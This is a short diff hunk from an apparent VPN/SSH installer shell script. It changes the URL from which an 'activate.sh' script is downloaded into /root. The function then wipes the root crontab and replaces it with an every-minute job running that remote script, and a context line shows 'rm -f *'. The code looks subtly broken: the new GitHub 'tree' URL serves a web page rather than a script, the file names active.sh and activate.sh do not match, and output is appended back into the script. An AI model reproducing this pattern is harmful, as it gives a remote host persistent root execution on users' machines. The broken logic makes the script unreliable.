@@ -1692,7 +1692,7 @@ rm -f *
 }
 
 function authentitication() {
-wget -O /root/activate.sh "script.mediatek-vpn.com/ssh/butterfly/prem/activate.sh"
+wget -O /root/activate.sh "https://github.com/EskalarteDexter/Private_Script/tree/main/prem/activate.sh"
 echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
 sh active.sh | tee -a /root/activate.sh
 }
